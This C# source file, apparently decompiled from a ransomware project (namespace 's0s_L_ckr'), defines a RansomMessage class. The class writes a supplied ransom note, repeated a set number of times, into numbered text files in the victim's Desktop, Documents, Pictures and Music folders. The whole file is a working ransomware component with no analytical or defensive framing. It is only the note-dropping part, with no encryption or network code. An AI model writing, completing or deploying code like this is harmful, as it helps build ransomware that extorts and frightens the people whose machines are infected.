using System;
using System.IO;

namespace s0s_L_ckr;

internal class RansomMessage
{
	private string Message { get; }

	private string FileName { get; }

	private int MessageCount { get; }

	public RansomMessage(string mess, string fileNam, int messCou)
	{
		Message = mess;
		FileName = fileNam;
		MessageCount = messCou;
	}

	public void WritMesToDes()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
		string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		WritMess(folderPath, Message, MessageCount, FileName);
		WritMess(folderPath2, Message, MessageCount, FileName);
		WritMess(folderPath3, Message, MessageCount, FileName);
		WritMess(folderPath4, Message, MessageCount, FileName);
	}

	private void WritMess(string fPath, string msg, int msgCo, string fName)
	{
		for (int i = 0; i < msgCo; i++)
		{
			string path = $"{fName}0x{i}.txt";
			string path2 = Path.Combine(fPath, path);
			FileStream stream;
			using (stream = new FileStream(path2, FileMode.OpenOrCreate))
			{
				StreamWriter streamWriter;
				using (streamWriter = new StreamWriter(stream))
				{
					streamWriter.Write(msg);
				}
			}
		}
	}
}
